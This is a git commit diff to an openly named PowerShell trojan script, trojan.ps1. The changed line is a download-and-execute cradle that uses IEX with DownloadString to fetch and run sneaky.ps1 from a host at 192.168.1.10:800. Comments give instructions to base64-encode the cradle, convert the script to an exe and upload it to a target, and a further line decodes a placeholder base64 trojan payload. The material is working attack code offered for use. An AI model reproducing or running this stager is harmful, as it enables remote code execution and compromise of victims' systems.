c4fa52e3ad699be2d2382021ddce63ef38f46bd2
Chandler Rose <109770223+RosePwns@users.noreply.github.com>
2022-11-09 22:24:32 -0600

    Update trojan.ps1

--- trojan.ps1
+++ trojan.ps1
@@ -1,5 +1,5 @@
 # Powershell base64 encode this: ----->
-echo IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:800/sneaky.ps1') | powershell -noprofile -
+IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:800/sneaky.ps1')
 
 # Convert this script to exe file and upload to target: ----->
 $A =[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("INSERT_BASE64_ENCODED_TROJAN"))
